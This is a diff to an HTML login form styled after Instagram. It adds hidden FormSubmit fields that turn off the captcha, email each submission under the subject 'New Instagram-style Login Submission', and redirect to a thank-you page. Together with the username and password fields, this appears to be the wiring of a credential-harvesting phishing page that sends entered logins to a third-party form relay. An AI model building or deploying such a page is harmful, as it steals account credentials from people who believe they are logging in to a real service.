@@ -84,13 +84,15 @@
       <input type="text" name="username" placeholder="Username or email" required />
       <input type="password" name="password" placeholder="Password" required />
       <button type="submit">Log In</button>
-      
+
       <div class="forgot-password">
         <a href="#">Forgot password?</a>
       </div>
-      
-      <!-- Optional: Stop bot spam -->
+
+      <!-- Hidden FormSubmit config -->
       <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_subject" value="New Instagram-style Login Submission">
+      <input type="hidden" name="_next" value="https://example.com/thank-you.html">
     </form>
 
     <div class="signup">
